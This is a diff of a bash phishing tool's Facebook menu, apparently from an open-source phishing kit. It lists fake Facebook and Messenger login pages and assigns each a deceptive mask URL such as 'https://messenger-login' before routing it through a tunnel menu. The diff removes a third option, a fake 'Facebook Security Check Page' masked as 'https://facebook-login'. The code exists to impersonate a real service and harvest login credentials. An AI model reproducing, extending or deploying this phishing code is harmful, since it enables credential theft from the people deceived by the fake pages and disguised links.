@@ -346,7 +346,6 @@ site_facebook() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${CYAN} Facebook Login Page
 		${RED}[${WHITE}02${RED}]${CYAN} Messenger Login Page
-		${RED}[${WHITE}03${RED}]${CYAN} Facebook Security Check Page
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -358,10 +357,6 @@ site_facebook() {
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		website="fb_messenger"
 		mask='https://messenger-login'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="fb_sec"
-		mask='https://facebook-login'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
